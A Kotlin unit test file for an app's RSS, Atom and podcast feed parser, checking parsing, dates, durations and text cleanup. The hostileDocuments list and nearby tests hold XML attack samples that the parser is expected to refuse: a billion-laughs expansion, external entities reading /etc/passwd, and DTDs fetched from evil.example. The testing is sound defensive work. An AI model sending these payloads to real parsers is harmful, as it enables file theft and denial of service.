package de.drehtuer.nextalarm.domain

import java.io.File
import java.io.IOException
import java.lang.reflect.Proxy
import java.time.Duration
import java.time.Instant
import kotlin.test.Test
import javax.xml.parsers.ParserConfigurationException
import javax.xml.parsers.SAXParser
import javax.xml.parsers.SAXParserFactory
import kotlin.test.assertEquals
import kotlin.test.assertFailsWith
import kotlin.test.assertFalse
import kotlin.test.assertNotNull
import kotlin.test.assertNull
import kotlin.test.assertTrue
import org.junit.jupiter.params.ParameterizedTest
import org.junit.jupiter.params.provider.MethodSource
import org.xml.sax.SAXException
import org.xml.sax.XMLReader

class FeedParserTest {
    private fun parse(xml: String) = parseFeed(xml.toByteArray(), "fallback.example")

    private fun rss(items: String, channel: String = "<title>Tagesschau</title>") =
        """<?xml version="1.0"?><rss version="2.0" xmlns:itunes="$ITUNES" xmlns:content="$CONTENT"><channel>$channel$items</channel></rss>"""

    private fun enclosure(url: String = "https://cdn.example/a.mp3", type: String = "audio/mpeg") =
        """<enclosure url="$url" length="1" type="$type"/>"""

    // Hostile documents. Each is refused with the parser's own protection switched on, and with only what also works on
    // Android, whose parser knows none of the strict features.

    @ParameterizedTest
    @MethodSource("hostileDocuments")
    fun `a hostile document is refused, with the strict features`(xml: String) {
        assertNull(parseFeed(xml.toByteArray(), "x"))
    }

    @ParameterizedTest
    @MethodSource("hostileDocuments")
    fun `a hostile document is refused by the handler alone, as on Android`(xml: String) {
        assertNull(parseFeed(xml.toByteArray(), "x", features = emptyList()))
    }

    @Test
    fun `an external entity does not get to read a file`() {
        val secret = File.createTempFile("secret", ".txt").apply { writeText("TOP-SECRET") }
        try {
            val xml = """<!DOCTYPE rss [<!ENTITY x SYSTEM "${secret.toURI()}">]><rss><channel><title>&x;</title></channel></rss>"""
            assertNull(parseFeed(xml.toByteArray(), "x", features = emptyList()))
            assertNull(parseFeed(xml.toByteArray(), "x"))
        } finally {
            assertTrue(secret.delete())
        }
    }

    @Test
    fun `a DOCTYPE in another encoding is refused too`() {
        val xml = """<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE rss SYSTEM "http://evil.example/a.dtd"><rss/>"""
        assertNull(parseFeed(xml.toByteArray(Charsets.UTF_16), "x", features = emptyList()))
    }

    @Test
    fun `an undeclared entity is an error and not a hole`() {
        assertNull(parse(rss("<item><title>&nope;</title></item>")))
    }

    @Test
    fun `a parser that does not know a feature still reads the feed`() {
        val feed = parseFeed(rss("<item><title>A</title></item>").toByteArray(), "x", listOf("urn:unknown-feature" to true))
        assertEquals(listOf("A"), feed?.entries?.map { it.title })
    }

    @Test
    fun `huge text is cut, and what is read aloud fits into one utterance`() {
        val long = "word ".repeat(40_000)
        val feed = assertNotNull(parse(rss("<item><title>$long</title><description>$long</description></item>")))
        val entry = feed.entries.single()
        assertEquals(500, entry.title.length)
        assertEquals(3_000, entry.summary?.length)
        assertTrue(entry.spokenText.length < 4_000)
    }

    @Test
    fun `the number of entries is limited, but the newest episode is found anywhere`() {
        val items = (1..150).joinToString("") { "<item><title>T$it</title></item>" } +
            "<item><title>Late</title><pubDate>Sat, 07 Nov 2026 05:00:00 GMT</pubDate>${enclosure()}</item>"
        val feed = assertNotNull(parse(rss(items)))
        assertEquals(100, feed.entries.size)
        assertEquals("Late", feed.latestEpisode?.title)
    }

    @Test
    fun `items inside items cannot confuse it`() {
        val feed = assertNotNull(parse(rss("<item><title>A</title><item><title>B</title></item><title>C</title></item>")))
        assertEquals(listOf("B"), feed.entries.map { it.title })
    }

    // What is not a feed.

    @Test
    fun `broken XML is no feed`() {
        assertNull(parse("<rss><channel>"))
        assertNull(parse("this is not xml"))
        assertNull(parse(""))
    }

    @Test
    fun `a web page is no feed, even if it is well-formed`() {
        assertNull(parse("<html><body><p>Hello</p></body></html>"))
    }

    @Test
    fun `an element named like a feed root in another namespace is no feed`() {
        assertNull(parse("""<feed xmlns="urn:other"/>"""))
        assertNull(parse("""<RDF xmlns="urn:other"/>"""))
        assertNull(parse("""<rss xmlns="urn:other"/>"""))
        assertNull(parse("""<other xmlns="http://www.w3.org/2005/Atom"/>"""))
        assertNull(parse("""<other xmlns="http://www.w3.org/1999/02/22-rdf-syntax-ns#"/>"""))
    }

    @Test
    fun `bytes that are not in the encoding the document claims are no feed`() {
        val bytes = """<?xml version="1.0" encoding="UTF-8"?><rss><channel><title>""".toByteArray() + byteArrayOf(-1, -2) +
            "</title></channel></rss>".toByteArray()
        assertNull(parseFeed(bytes, "x"))
    }

    @Test
    fun `a parser that cannot be set up reads no feed`() {
        val broken = object : SAXParserFactory() {
            override fun newSAXParser(): SAXParser = throw ParserConfigurationException("No parser")
            override fun setFeature(name: String?, value: Boolean): Unit = throw ParserConfigurationException("No feature")
            override fun getFeature(name: String?) = false
        }
        assertNull(parseFeed("<rss/>".toByteArray(), "x", listOf("urn:feature" to true), broken))
    }

    @Test
    fun `a read that fails reads no feed`() {
        val reader = Proxy.newProxyInstance(XMLReader::class.java.classLoader, arrayOf(XMLReader::class.java)) { _, method, _ ->
            if (method.name == "parse") throw IOException("Gone")
            null
        } as XMLReader
        val parser = object : SAXParser() {
            override fun getXMLReader() = reader
            override fun getParser() = error("Not needed")
            override fun isNamespaceAware() = true
            override fun isValidating() = false
            override fun setProperty(name: String?, value: Any?) = Unit
            override fun getProperty(name: String?) = null
        }
        val factory = object : SAXParserFactory() {
            override fun newSAXParser() = parser
            override fun setFeature(name: String?, value: Boolean) = Unit
            override fun getFeature(name: String?) = false
        }
        assertNull(parseFeed("<rss/>".toByteArray(), "x", emptyList(), factory))
    }

    @Test
    fun `the guard refuses what reaches it`() {
        val guard = HostileXmlGuard()
        assertFailsWith<SAXException> { guard.startDTD("rss", null, "http://evil.example/a.dtd") }
        assertFailsWith<SAXException> { guard.resolveEntity(null, "http://evil.example/a") }
        assertFailsWith<SAXException> { guard.resolveEntity("x", null, null, "http://evil.example/a") }
    }

    // RSS.

    @Test
    fun `an RSS feed has its name and entries, in the order of the feed`() {
        val feed = assertNotNull(
            parse(
                rss(
                    """
                    <image><title>Not the name</title></image>
                    <item><title>One</title><description>First text</description><pubDate>Sat, 07 Nov 2026 05:00:00 +0100</pubDate></item>
                    <item><title>Two</title><link>https://example/two</link></item>
                    """,
                ),
            ),
        )
        assertEquals(NewsType.RSS, feed.kind)
        assertEquals("Tagesschau", feed.name)
        assertNull(feed.latestEpisode)
        assertNull(feed.author)
        assertEquals(
            listOf(
                FeedEntry("One", "First text", Instant.parse("2026-11-07T04:00:00Z")),
                FeedEntry("Two", null, null),
            ),
            feed.entries,
        )
    }

    @Test
    fun `a feed without a title takes the fallback name`() {
        assertEquals("fallback.example", parse("<rss><channel/></rss>")?.name)
        assertEquals("fallback.example", parse(rss("", channel = "<title>  </title>"))?.name)
    }

    @Test
    fun `an entry with only text uses it as its title, and an empty one is dropped`() {
        val feed = assertNotNull(parse(rss("<item><description>Only text</description></item><item><link>x</link></item>")))
        assertEquals(listOf(FeedEntry("Only text", null, null)), feed.entries)
    }

    @Test
    fun `the full content stands in for a missing description`() {
        val feed = assertNotNull(parse(rss("<item><title>A</title><content:encoded><![CDATA[<p>Full</p>]]></content:encoded></item>")))
        assertEquals("Full", feed.entries.single().summary)
        val both = assertNotNull(
            parse(rss("<item><title>A</title><description>Short</description><content:encoded>Full</content:encoded></item>")),
        )
        assertEquals("Short", both.entries.single().summary)
    }

    @Test
    fun `elements from other namespaces do not count`() {
        val feed = assertNotNull(parse(rss("""<item xmlns:m="urn:media"><title>A</title><m:title>B</m:title></item>""")))
        assertEquals("A", feed.entries.single().title)
    }

    @Test
    fun `HTML inside the text is not read aloud`() {
        val feed = assertNotNull(
            parse(rss("<item><title>A &amp;amp; B</title><description><![CDATA[<p>One&nbsp;<b>two</b></p><script>evil()</script>]]></description></item>")),
        )
        assertEquals("A & B", feed.entries.single().title)
        assertEquals("One two", feed.entries.single().summary)
    }

    @Test
    fun `an RSS 1 feed is read`() {
        val feed = parse(
            """
            <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns="http://purl.org/rss/1.0/" xmlns:dc="http://purl.org/dc/elements/1.1/">
              <channel><title>Old</title></channel>
              <item><title>One</title><dc:date>2026-11-07T05:00:00Z</dc:date></item>
            </rdf:RDF>
            """.trimIndent(),
        )
        assertEquals("Old", feed?.name)
        assertEquals(listOf(FeedEntry("One", null, Instant.parse("2026-11-07T05:00:00Z"))), feed?.entries)
    }

    @Test
    fun `an Atom feed is read`() {
        val feed = assertNotNull(
            parse(
                """
                <feed xmlns="http://www.w3.org/2005/Atom">
                  <title>Atom News</title>
                  <entry><title>Published</title><summary>Text</summary><updated>2026-11-07T06:00:00Z</updated><published>2026-11-07T05:00:00Z</published></entry>
                  <entry><title>Updated</title><content>Body</content><updated>2026-11-07T06:00:00Z</updated></entry>
                  <entry><title>Both</title><published>2026-11-07T05:00:00Z</published><updated>2026-11-07T06:00:00Z</updated><link rel="alternate" href="https://example/x"/></entry>
                </feed>
                """.trimIndent(),
            ),
        )
        assertEquals(NewsType.RSS, feed.kind)
        assertEquals("Atom News", feed.name)
        assertEquals(
            listOf(
                FeedEntry("Published", "Text", Instant.parse("2026-11-07T05:00:00Z")),
                FeedEntry("Updated", "Body", Instant.parse("2026-11-07T06:00:00Z")),
                FeedEntry("Both", null, Instant.parse("2026-11-07T05:00:00Z")),
            ),
            feed.entries,
        )
    }

    // Podcasts.

    @Test
    fun `a feed with audio is a podcast, and the newest episode counts`() {
        val feed = assertNotNull(
            parse(
                rss(
                    """
                    <item><title>Older</title><pubDate>Fri, 06 Nov 2026 05:00:00 GMT</pubDate>${enclosure("https://cdn.example/old.mp3")}</item>
                    <item><title>Newest</title><pubDate>Sat, 07 Nov 2026 05:00:00 GMT</pubDate><itunes:duration>18:30</itunes:duration>${enclosure()}</item>
                    <item><title>Oldest</title><pubDate>Thu, 05 Nov 2026 05:00:00 GMT</pubDate>${enclosure("https://cdn.example/oldest.mp3")}</item>
                    """,
                    channel = "<title>Der Tag</title><itunes:author>Deutschlandfunk</itunes:author>",
                ),
            ),
        )
        assertEquals(NewsType.PODCAST, feed.kind)
        assertEquals("Der Tag", feed.name)
        assertEquals("Deutschlandfunk", feed.author)
        assertEquals(3, feed.entries.size)
        assertEquals(
            PodcastEpisode("Newest", "https://cdn.example/a.mp3", Duration.ofSeconds(1110), Instant.parse("2026-11-07T05:00:00Z")),
            feed.latestEpisode,
        )
    }

    @Test
    fun `without dates the first episode counts, as feeds put the newest first`() {
        val feed = parse(rss("<item><title>First</title>${enclosure()}</item><item><title>Second</title>${enclosure("https://c.example/b.mp3")}</item>"))
        assertEquals("First", feed?.latestEpisode?.title)
    }

    @Test
    fun `an episode with a date beats one without, whichever comes first`() {
        val dated = "<item><title>Dated</title><pubDate>Sat, 07 Nov 2026 05:00:00 GMT</pubDate>${enclosure()}</item>"
        val undated = "<item><title>Undated</title>${enclosure("https://c.example/b.mp3")}</item>"
        assertEquals("Dated", parse(rss(undated + dated))?.latestEpisode?.title)
        assertEquals("Dated", parse(rss(dated + undated))?.latestEpisode?.title)
    }

    @Test
    fun `an episode without a title takes the name of the podcast`() {
        assertEquals("Tagesschau", parse(rss("<item>${enclosure()}</item>"))?.latestEpisode?.title)
    }

    @Test
    fun `a blank author counts as none`() {
        assertNull(parse(rss("", channel = "<itunes:author> </itunes:author>"))?.author)
    }

    @Test
    fun `video enclosures are of no use`() {
        assertNull(parse(rss("<item><title>A</title>${enclosure("https://c.example/a.mp4", "video/mp4")}</item>"))?.latestEpisode)
    }

    @Test
    fun `a file whose type is not given goes by its name`() {
        fun episode(url: String, type: String) = parse(rss("<item>${enclosure(url, type)}</item>"))?.latestEpisode
        assertEquals("https://c.example/a.MP3?x=1#y", episode("https://c.example/a.MP3?x=1#y", "")?.audioUrl)
        assertNotNull(episode("https://c.example/a.opus", "application/octet-stream"))
        assertNull(episode("https://c.example/a.pdf", ""))
        assertNull(parse(rss("""<item><enclosure url="https://c.example/a"/></item>"""))?.latestEpisode)
        assertNotNull(parse(rss("""<item><enclosure url="https://c.example/a.mp3"/></item>"""))?.latestEpisode)
    }

    @Test
    fun `an enclosure that is not on the web is never played`() {
        listOf("file:///etc/passwd", "content://x/y", "javascript:alert(1)", "/relative/a.mp3", "http://").forEach {
            assertNull(parse(rss("<item>${enclosure(it)}</item>"))?.latestEpisode, it)
        }
    }

    @Test
    fun `an address in an attribute of another namespace does not count`() {
        val item = """<item xmlns:x="urn:x"><enclosure x:url="https://c.example/a.mp3" type="audio/mpeg"/></item>"""
        assertNull(parse(rss(item))?.latestEpisode)
    }

    @Test
    fun `an enclosure without an address is skipped`() {
        assertNull(parse(rss("""<item><enclosure type="audio/mpeg"/></item>"""))?.latestEpisode)
    }

    @Test
    fun `the first usable enclosure of an episode counts, and whitespace does not matter`() {
        val item = "<item><title>A</title>" + enclosure(" https://c.example/first.mp3 ") + enclosure("https://c.example/second.mp3") + "</item>"
        assertEquals("https://c.example/first.mp3", parse(rss(item))?.latestEpisode?.audioUrl)
    }

    @Test
    fun `Atom marks its audio with a link`() {
        val feed = parse(
            """
            <feed xmlns="http://www.w3.org/2005/Atom"><title>P</title>
              <entry><title>E</title><link rel="enclosure" type="audio/mpeg" href="https://c.example/a.mp3"/></entry>
            </feed>
            """.trimIndent(),
        )
        assertEquals("https://c.example/a.mp3", feed?.latestEpisode?.audioUrl)
    }

    @Test
    fun `a link without an address is skipped`() {
        val feed = parse(
            """<feed xmlns="http://www.w3.org/2005/Atom"><entry><title>E</title><link rel="enclosure" type="audio/mpeg"/></entry></feed>""",
        )
        assertNull(feed?.latestEpisode)
    }

    // The small helpers.

    @Test
    fun `dates in the formats of RSS and Atom are understood`() {
        assertEquals(Instant.parse("2026-11-07T05:00:00Z"), parseFeedDate(" Sat, 07 Nov 2026 05:00:00 GMT "))
        assertEquals(Instant.parse("2026-11-07T04:00:00Z"), parseFeedDate("2026-11-07T05:00:00+01:00"))
        assertNull(parseFeedDate("yesterday"))
        assertNull(parseFeedDate(""))
    }

    @Test
    fun `the durations of podcasts are understood`() {
        assertEquals(Duration.ofSeconds(1110), parseFeedDuration("1110"))
        assertEquals(Duration.ofSeconds(1110), parseFeedDuration(" 18:30 "))
        assertEquals(Duration.ofSeconds(3723), parseFeedDuration("1:02:03"))
        assertNull(parseFeedDuration("0"))
        assertNull(parseFeedDuration("1:2:3:4"))
        assertNull(parseFeedDuration("abc"))
        assertNull(parseFeedDuration("-5"))
        assertNull(parseFeedDuration(""))
    }

    @Test
    fun `entities are decoded once`() {
        assertEquals("& < > \" '", plainText("&amp; &lt; &gt; &quot; &apos;"))
        assertEquals("AB", plainText("&#65;&#x42;"))
        assertEquals("X", plainText("&#X58;"))
        assertEquals("&amp;", plainText("&amp;amp;"))
        assertEquals("&unknown;", plainText("&unknown;"))
    }

    @Test
    fun `an entity that is no character is dropped`() {
        assertEquals("a b", plainText("a&#9999999;b"))
    }

    @Test
    fun `hidden elements are dropped with their contents`() {
        assertEquals("a b", plainText("a<style type='x'>p{}</style>b"))
        assertEquals("a b", plainText("a<SCRIPT>\nx()\n</script >b"))
        assertFalse("x()" in plainText("<script>x()</script>"))
    }

    companion object {
        private const val ITUNES = "http://www.itunes.com/dtds/podcast-1.0.dtd"
        private const val CONTENT = "http://purl.org/rss/1.0/modules/content/"

        private val LAUGHS = buildString {
            append("""<?xml version="1.0"?><!DOCTYPE rss [<!ENTITY a0 "ha">""")
            (1..30).forEach { append("""<!ENTITY a$it "&a${it - 1};&a${it - 1};&a${it - 1};&a${it - 1};">""") }
            append("]><rss><channel><title>&a30;</title></channel></rss>")
        }

        @JvmStatic
        fun hostileDocuments(): List<String> = listOf(
            // The billion laughs.
            LAUGHS,
            // A file, through an external entity.
            """<?xml version="1.0"?><!DOCTYPE rss [<!ENTITY x SYSTEM "file:///etc/passwd">]><rss><channel><title>&x;</title></channel></rss>""",
            // The network, through a parameter entity.
            """<?xml version="1.0"?><!DOCTYPE rss [<!ENTITY % x SYSTEM "http://evil.example/a.dtd">%x;]><rss/>""",
            // The network, through an external DTD.
            """<?xml version="1.0"?><!DOCTYPE rss SYSTEM "http://evil.example/a.dtd"><rss/>""",
            // A plain DOCTYPE, which would be harmless, but which has no business in a feed.
            """<!DOCTYPE rss><rss><channel><title>A</title></channel></rss>""",
        )
    }
}
